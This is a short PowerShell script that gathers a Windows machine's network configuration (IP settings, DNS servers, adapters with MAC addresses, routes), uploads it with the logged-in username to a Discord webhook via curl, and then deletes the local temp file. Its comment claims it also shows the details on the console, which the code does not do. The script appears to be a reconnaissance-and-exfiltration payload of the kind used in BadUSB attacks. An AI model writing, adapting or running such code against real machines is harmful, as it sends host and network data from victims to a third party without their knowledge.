# n.ps1
# This script will display the network configuration details on the console and also save them to a file in the same directory, then send to a discord webhook.

function Send-ToDiscord {
    param (
        [Parameter(Mandatory=$true)]
        [string]$filePath,
        [Parameter(Mandatory=$true)]
        [string]$hookUrl
    )


    $message = @{
        username = $env:USERNAME
        content = "Uploading network configuration details"
    }

    # Send 
    Invoke-RestMethod -Uri $hookUrl -Method Post -ContentType 'Application/Json' -Body ($message | ConvertTo-Json)

    # Upload
    curl.exe -F "file1=@$filePath" $hookUrl
}

# Specify the Discord webhook URL here
$discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'

# Gather network details
$networkDetails = Get-NetIPConfiguration | Out-String
$networkDetails += Get-DnsClient | Out-String
$networkDetails += Get-DnsClientServerAddress | Out-String
$networkDetails += Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed | Out-String
$networkDetails += Get-NetRoute | Select-Object DestinationPrefix, NextHop, RouteMetric, ifIndex | Out-String

# Save to a temp file
$tempFile = [IO.Path]::GetTempFileName() + ".txt"
$networkDetails | Out-File $tempFile

# Send to Discord
Send-ToDiscord -filePath $tempFile -hookUrl $discordWebhookUrl

#Remove the temporary file
Remove-Item $tempFile

